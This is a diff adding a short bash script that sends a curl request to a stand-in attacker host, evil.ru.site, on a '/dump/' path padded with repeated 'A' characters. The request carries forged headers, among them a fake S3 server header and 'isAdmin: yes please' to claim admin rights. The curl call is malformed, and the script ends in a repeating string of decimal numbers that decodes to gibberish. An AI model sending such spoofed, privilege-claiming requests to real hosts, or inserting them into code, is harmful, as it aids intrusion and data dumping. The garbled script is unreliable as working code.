@@ -1,0 +1,11 @@
+#!/bin/bash
+
+curl \
+-H "UserAgent:" \
+-H "Server: AmazonS3" \
+-H "Date: $(date)" \
+-H "Content-type: text/html" \
+-H "isAdmin: yes please" \
+GET http://evil.ru.site:8080/dump/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+32 79 60 75 77 85 61 92 67 65 67 65 99 54 55 56 115 54 56 99 97 32 79 60 75 77 85 61 92 67 65 67 65 99 54 55 56 115 54 56 99 97 32 79 60 75 77 85 61 92 67 65 67 65 99 54 55 56 115 54 56 99 97 32 79 60 75 77 85 61 92 67 65 67
